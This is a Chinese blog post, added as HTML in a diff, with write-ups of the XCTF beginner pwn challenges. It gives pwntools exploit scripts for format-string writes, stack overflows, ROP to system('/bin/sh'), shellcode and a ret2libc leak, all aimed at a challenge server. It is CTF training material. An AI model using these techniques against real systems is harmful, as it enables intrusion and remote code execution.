@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    攻防世界新手区pwn |
+    
+    summerN&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-攻防世界新手区pwn" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      攻防世界新手区pwn
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/12/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BApwn/" class="article-date">
+  <time datetime="2019-12-22T13:26:27.160Z" itemprop="datePublished">2019-12-22</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h1 id="攻防世界新手区pwn"><a href="#攻防世界新手区pwn" class="headerlink" title="攻防世界新手区pwn"></a>攻防世界新手区pwn</h1><h2 id="1-nc"><a href="#1-nc" class="headerlink" title="1 nc"></a>1 nc</h2><a id="more"></a>
+
+<p>nc 链接获取flag</p>
+<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>知识：</p>
+<p>关于stdin的知识见博客：<a href="https://blog.csdn.net/xmzzy2012/article/details/80584910" target="_blank" rel="noopener">https://blog.csdn.net/xmzzy2012/article/details/80584910</a></p>
+<p>即：在c语言中表现为调用printf函数将内容输出到终端上。</p>
+<p>这里使用的知识点为任意地址写入：</p>
+<p>我们先找到偏移量</p>
+<p>通过查看找到偏移量offset为：10</p>
+<p>之后我们就可以使用任意地址写</p>
+<p>上exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">46545</span>)</span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line">pwnme_add = <span class="number">0x804a068</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"summerN"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"please:\n"</span>)</span><br><span class="line">payload = p32(pwnme_add) + <span class="string">"%4c%10$hhn"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>首先查看保护</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575530101770.png" alt="1575530101770"></p>
+<p>发现开启了栈溢出保护但是对于这个题来说貌似没什么卵用</p>
+<p>看完程序，发现直接从get（）那里溢出进入v5直接覆盖就好</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">59473</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"What's Your Birth?\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"12"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"What's Your Name?\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">8</span> + p64(<span class="number">1926</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>先checksec一下</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575532324737.png" alt="1575532324737"></p>
+<p>64位</p>
+<p>bss数据区覆盖一下就可以</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">33733</span>)</span><br><span class="line">p.recvuntil(<span class="string">"lets get helloworld for bof\n"</span>)</span><br><span class="line">x = hex(<span class="number">1853186401</span>)</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">payload = <span class="string">"BBBB"</span> + p64(<span class="number">0x6e756161</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<p>p64这类打包函数不可以使用例如x = hex(11)这类的函数</p>
+<p>而可以使用直接对变量赋值的变量例如x = 11</p>
+<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>先check</p>
+<p><strong><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575536109047.png" alt="1575536109047"></strong></p>
+<p>看IDA</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_</span><br><span class="line">        </span><br><span class="line">        level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">59602</span>)</span><br><span class="line">bin_add = <span class="number">0x400596</span></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x80</span> + <span class="number">8</span>)  + p64(bin_add)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>这里的话就是构造32位程序的ROP链</p>
+<p>注意这种问题在使用elf.symbols()获取的system（）函数的地址</p>
+<p>32位会出现，64位应该不会，所以32位多填充p32(),64位多填充p64()</p>
+<p>也就是说只要是搜索出的call system（不是自己定义的危险函数）在system 与其后面的参数之间就要间隔对应的参数</p>
+<p>很简单，但是遇到了一个问题</p>
+<p>1.如果直接使用后text段的system地址的话，就很好说，不用废话</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">32152</span>)</span><br><span class="line">bin_add = <span class="number">0x0804a024</span></span><br><span class="line">sys_add = <span class="number">0x804849e</span></span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys_add)  + p32(bin_add)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>2.但是如果使用.plt段的system函数的真实地址的话就不大行了</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">32152</span>)</span><br><span class="line">bin_add = <span class="number">0x0804a024</span></span><br><span class="line">sys_add = <span class="number">0x8048320</span></span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys_add)+ <span class="string">"a"</span> *<span class="number">4</span>  + p32(bin_add)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>具体是因为什么我也不清楚</p>
+<p>总之先记住</p>
+<p>如果是从libc泄露的system的话。。。。应该是第二种了吧</p>
+<p>看下我自己的认为。。</p>
+<p>在使用.plt段的system时</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575550541723.png" alt="1575550541723"></p>
+<p>看这个哈</p>
+<p>我们输入的bin/sh因该位于ptr 向后4个的位置，往后看你会发先会有一个call的指令</p>
+<p>我们都知道call会向栈中push一个下一条指令的地址（貌似是在str的位置，具体也不清楚）</p>
+<p>因此我们要先将这个地址覆盖之后我们才可以传入bin/sh</p>
+<p>就先这样理解吧。。。。</p>
+<p>其实刚才那样理解就是这个意思：</p>
+<h5 id="跟栈帧结构有关，每个函数的栈结构是实参‘-bin-sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行"><a href="#跟栈帧结构有关，每个函数的栈结构是实参‘-bin-sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行" class="headerlink" title="跟栈帧结构有关，每个函数的栈结构是实参‘/bin/sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行"></a>跟栈帧结构有关，每个函数的栈结构是实参‘/bin/sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行</h5><p>就先这样吧。。</p>
+<h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>先增加一个知识，函数指针</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575594271298.png" alt="1575594271298"></p>
+<p><a href="http://c.biancheng.net/view/228.html" target="_blank" rel="noopener">http://c.biancheng.net/view/228.html</a></p>
+<p>关于函数指针的介绍</p>
+<p>再来看这里</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575594310241.png" alt="1575594310241"></p>
+<p>这里把v1这个void类型指针先强制类型转化为一个返回八字节的函数指针</p>
+<p>通过read函数向其赋值地址</p>
+<p>再来增加几个知识：</p>
+<p>alarm()可以用来限制运行时间，干扰调试</p>
+<p>mmap（）可以开辟出一片可读可写的内存空间</p>
+<p>我们来找偏移</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575600921737.png" alt="1575600921737"></p>
+<p>从IDA上可以看到，我们可以a1的地址存放到偏移量为7的地方，所以构造以下字符串</p>
+<p>构造payload = %85d%7&amp;n</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">54738</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">v3 = p.recvline().strip(<span class="string">"\n"</span>)</span><br><span class="line">v3_add = int((<span class="string">"0x"</span> + str(v3)),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> v3_add</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"What should your character's name be:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"So, where you will go?east or up?:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"east"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"o into there(1), or leave(0)?:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"'Give me an address'\n"</span>)</span><br><span class="line">p.sendline(str(v3_add))</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"And, you wish is:\n"</span>)</span><br><span class="line">payload = <span class="string">"%85c%7$n"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Wizard: I will help you! USE YOU SPELL\n"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> shellcode</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>注意：！！！！！</p>
+<p>在写shellcode的时候最好加一下context</p>
+<h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><h3 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h3><p>​        srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned  int类型，通常我们会使用time(0)或time(NULL)的返回值作为seed。</p>
+<h3 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h3><p>​        rand()函数是使用线性同余法做的，它并不是真的随机数，因为其周期特别长，所以在一定范围内可以看成随机的。<br>​         rand()函数不需要参数，它将会返回0到RAND_MAX之间的任意的整数。</p>
+<p>这里用到了python与c语言交互的一个库</p>
+<p>关于ctype库与dll<br>我们使用python标准库中自带的ctypes模块进行python和c的混合编程<br>libc共享库<br>可以使用ldd查找</p>
+<p>注意，我们在使用sendlineafter()函数的时候不可以加上\n，这样的话是无法识别的</p>
+<p>同时输入的为字符串形式</p>
+<p>上exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("./1")</span></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">38308</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#print p.recvuntil("Your name:\n")</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">32</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"name:"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">"number:"</span>,str(libc.rand()%<span class="number">6</span> + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>
+
+<h1 id="9-整数溢出"><a href="#9-整数溢出" class="headerlink" title="9 整数溢出"></a>9 整数溢出</h1><p>知识点：整数溢出</p>
+<p>详情见自己写的博客或ctf_wiki</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="comment">#Author:summerN</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">51446</span>)</span><br><span class="line"><span class="comment">#p = process("./1")</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">payload1 = <span class="string">"1"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Please input your username:\n"</span>)</span><br><span class="line">payload2 = <span class="string">"summerN"</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Please input your passwd:\n"</span>)</span><br><span class="line">payload3 = <span class="string">"a"</span> * (<span class="number">0x14</span> + <span class="number">4</span>) + p32(<span class="number">0x804868b</span>)</span><br><span class="line">payload3 = payload3.ljust(<span class="number">259</span>,<span class="string">'b'</span>) <span class="comment">#范围</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>
+
+<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>一个通过栈溢出漏洞使用write函数泄露libc基地址的题目</p>
+<p>libc文件题目已经给出</p>
+<p>获取基地址后基本的rop</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./level3'</span></span><br><span class="line">libc_name = <span class="string">'libc_32.so.6'</span></span><br><span class="line"><span class="comment">#libc_name = '/lib/i386-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'42539'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line">libc_got = elf.got[<span class="string">"__libc_start_main"</span>]</span><br><span class="line"><span class="comment">#print libc_got</span></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">main = <span class="number">0x8048484</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"a"</span> * (offset + <span class="number">4</span>) + p32(write_plt) + p32(main)  <span class="comment">#此处的main未返回地址</span></span><br><span class="line">payload1 +=   p32(<span class="number">1</span>) + p32(libc_got) + p32(<span class="number">4</span>)<span class="comment">#使用write泄露libc基地址</span></span><br><span class="line"><span class="keyword">print</span> payload1</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.recvuntil('@\n')</span></span><br><span class="line">write_add = u32(p.recv(<span class="number">4</span>).strip(<span class="string">"\n"</span>).ljust(<span class="number">4</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(write_add)</span><br><span class="line"></span><br><span class="line">libc_add = write_add - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">sys_add = libc_add + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_add = libc_add + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span> * (offset + <span class="number">4</span>) + p32(sys_add) + <span class="string">'aaaa'</span> + p32(bin_add)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Input:\n"</span>) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BApwn/" data-id="ck4h1petw0000nkluc190ait4"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2019/12/21/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%9A%A8%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">安恒月赛暨北京工业大学</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '',
+      clientSecret: '',
+      repo: '',
+      owner: '',
+      admin: [''],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 summerN&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
